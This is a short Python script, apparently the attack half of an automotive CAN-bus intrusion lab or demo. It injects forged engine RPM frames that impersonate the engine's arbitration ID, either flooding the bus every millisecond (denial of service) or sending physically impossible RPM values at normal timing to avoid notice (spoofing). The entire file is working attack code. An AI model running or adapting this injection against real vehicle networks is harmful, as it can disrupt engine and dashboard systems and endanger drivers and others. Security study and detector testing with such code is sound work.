import can
import time
import random
import config
import argparse

def hacker_attack(mode):
    bus = can.Bus(**config.BUS_CONFIG)
    print(f" HACKER NODE CONNECTED... Mode: {mode.upper()}")
    time.sleep(2)
    
    try:
        while True:
            if mode == 'dos':
                # DoS Attack: Spam messages ASAP
                fake_rpm = random.randint(5000, 8000)
                interval = 0.001 # Extremely fast
            else:
                # Spoofing Attack: Valid timing, invalid data (Physically impossible jumps)
                fake_rpm = random.choice([1000, 8000, 1500, 7500])
                interval = 0.1 # Normal engine interval (stealthy)

            rpm_bytes = fake_rpm.to_bytes(2, byteorder='big')
            
            msg = can.Message(arbitration_id=config.CAN_ID_ENGINE, # Impersonating Engine
                              data=[rpm_bytes[0], rpm_bytes[1], 0, 0, 0, 0, 0, 0],
                              is_extended_id=False)
            
            bus.send(msg)
            print(f" -> INJECTED: {fake_rpm} RPM (Interval: {interval}s)")
            
            time.sleep(interval) 

    except KeyboardInterrupt:
        print("Hacker Disconnected.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--mode', choices=['dos', 'spoof'], default='spoof', help='Attack mode')
    args = parser.parse_args()
    
    hacker_attack(args.mode)